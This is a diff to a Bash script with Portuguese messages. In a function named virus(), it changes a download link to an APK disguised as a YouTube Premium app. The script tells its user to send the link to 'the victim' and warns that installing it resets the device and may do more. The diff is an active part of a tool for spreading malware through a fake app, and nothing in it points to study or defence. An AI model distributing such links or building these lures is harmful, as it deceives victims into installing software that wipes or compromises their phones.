@@ -83,7 +83,7 @@ virus(){
     echo -e "${white}Copie o link abaixo e envie para a vítima."
     echo -e "${white}Ao instalar, o aparelho será resetado e outras ações podem ocorrer."
     echo
-    echo -e "${grn}LINK:${cyan} https://www.dropbox.com/scl/fi/w76kw3gyerpm3ipo37qte/YOUTUBE-PREMIUM.apk?rlkey=w23zf4luijt5uys8xg4zw29no&st=af9hfuiy&dl=0${rset}"
+    echo -e "${grn}LINK:${cyan} https://www.mediafire.com/file/xvb6yrkn5levdwr/YOUTUBE_PREMIUM.apk/file${rset}"
     echo
     echo -e "${red}Use por sua conta e risco. Responsabilidade total do usuário.${rset}"
     echo
